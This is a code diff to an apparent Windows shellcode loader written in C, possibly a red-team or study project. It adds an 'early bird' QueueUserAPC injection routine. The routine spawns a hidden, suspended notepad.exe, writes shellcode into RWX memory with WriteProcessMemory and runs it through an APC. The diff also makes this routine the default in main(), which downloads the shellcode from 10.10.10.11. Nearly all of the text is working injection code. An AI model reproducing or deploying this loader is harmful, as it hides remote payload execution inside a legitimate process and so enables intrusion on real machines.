@@ -14,7 +14,8 @@
 enum InjectionType {
     INJECTION_TYPE_FUNCTION_POINTER,
     INJECTION_TYPE_CREATE_THREAD,
-    INJECTION_TYPE_CREATE_REMOTE_THREAD
+    INJECTION_TYPE_CREATE_REMOTE_THREAD,
+    INJECTION_TYPE_QUEUE_USER_APC
 };
 
 void dprintf(
@@ -365,18 +366,120 @@ error:
     return 1;
 }
 
+// Instead of injecting into an existing process, we'll spawn our own process in a suspended state
+// Then inject the shellcode, and then qeueu a call to the shellcode on its primary thread
+int injectShellcodeWithQueueUserAPC(BYTE* shellcode, DWORD dwShellcodeLength) {
+    // Create the new process - notepad.exe for now, but with CREATE_NO_WINDOW
+    wchar_t lpApplicationName[] = L"C:\\Windows\\notepad.exe";
+    wchar_t* lpCommandLine = NULL;
+    // Inherit
+    LPSECURITY_ATTRIBUTES processAttributes = NULL;
+    LPSECURITY_ATTRIBUTES threadAttributes = NULL;
+    BOOL bInheritHandles = FALSE;
+    // CREATE_SUSPENDED is important:
+    DWORD dwCreationFlags = CREATE_NO_WINDOW | CREATE_SUSPENDED;
+    LPVOID lpEnvironment = NULL;
+
+    LPCWSTR lpCurrentDirectory = NULL;
+    STARTUPINFO startupInfo = { 0 };
+    startupInfo.cb = sizeof(startupInfo);
+    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
+    PROCESS_INFORMATION processInformation = { 0 };
+    BOOL success;
+    success = CreateProcessW(
+            lpApplicationName,
+            lpCommandLine,
+            processAttributes,
+            threadAttributes,
+            bInheritHandles,
+            dwCreationFlags,
+            lpEnvironment,
+            lpCurrentDirectory,
+            &startupInfo,
+            &processInformation
+    );
+
+    if (!success) {
+        printf("[x] Failed to create process\n");
+        goto error;
+    }
+
+    printf("dwProcessId=%ld\n", processInformation.dwProcessId);
+    printf("dwThreadId=%ld\n", processInformation.dwThreadId);
+    printf("hProcess=0x%p\n",processInformation.hProcess);
+    printf("hThread=0x%p\n", processInformation.hThread);
+
+    // Allocate rwx memory in the created process
+    LPVOID lpAllocMemory = VirtualAllocEx(
+            processInformation.hProcess,
+            NULL, // Set address as null to allocate somewhere arbitrary
+            dwShellcodeLength,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE
+    );
+
+    dprintf(L"Allocated memory location: 0x%p\n", lpAllocMemory);
+
+    if (!lpAllocMemory) {
+        dprintfWithLastError(L"Failed to alloc memory");
+        goto error;
+    }
+
+    dprintf(L"Writing to target memory");
+    SIZE_T dwBytesWritten = 0;
+    if (!WriteProcessMemory(
+            processInformation.hProcess,
+            lpAllocMemory,
+            shellcode,
+            (SIZE_T) dwShellcodeLength,
+            &dwBytesWritten
+    )) {
+        dprintfWithLastError(L"Failed to write process memory");
+        goto error;
+    }
+
+    dprintf(L"Wrote total bytes %d\n", dwBytesWritten);
+
+    // Use QueueUserAPC instead of CreateRemoteThrea
+    DWORD dwThreadId = 0;
+    if(!QueueUserAPC(
+            (PAPCFUNC) lpAllocMemory,
+            processInformation.hThread,
+            0
+    )) {
+        dprintfWithLastError(L"Failed to run queue user apc");
+        goto error;
+    }
+
+    // Wait for child to exit
+    //WaitForSingleObject(processInformation.hProcess, INFINITE);
+
+    // Resume the process that we originally suspended
+    ResumeThread(processInformation.hThread);
+
+    // Close process and thread handles
+    CloseHandle(processInformation.hProcess);
+    CloseHandle(processInformation.hThread);
+
+    return 0;
+    error:
+    printLastError();
+
+    return 1;
+}
+
 int main() {
     DWORD dwShellcodeLength = 0;
     BYTE* shellcode = download(L"10.10.10.11", 8000, L"/shellcode.bin", &dwShellcodeLength);
     if (!shellcode) {
-        printf(L"failed downloading shellcode\n");
+        dprintf(L"failed downloading shellcode\n");
         return 1;
     }
 
     dprintf(L"shellcode location: %p\n", shellcode);
     //hexdump(shellcode, dwShellcodeLength);
 
-    enum InjectionType injectionType = INJECTION_TYPE_CREATE_REMOTE_THREAD;
+    enum InjectionType injectionType = INJECTION_TYPE_QUEUE_USER_APC;
 
     switch (injectionType) {
         case INJECTION_TYPE_FUNCTION_POINTER: {
@@ -388,6 +491,10 @@ int main() {
         }
         case INJECTION_TYPE_CREATE_REMOTE_THREAD: {
             injectShellcodeWithRemoteThread(shellcode, dwShellcodeLength);
+            break;
+        }
+        case INJECTION_TYPE_QUEUE_USER_APC: {
+            injectShellcodeWithQueueUserAPC(shellcode, dwShellcodeLength);
             break;
         }
         default:
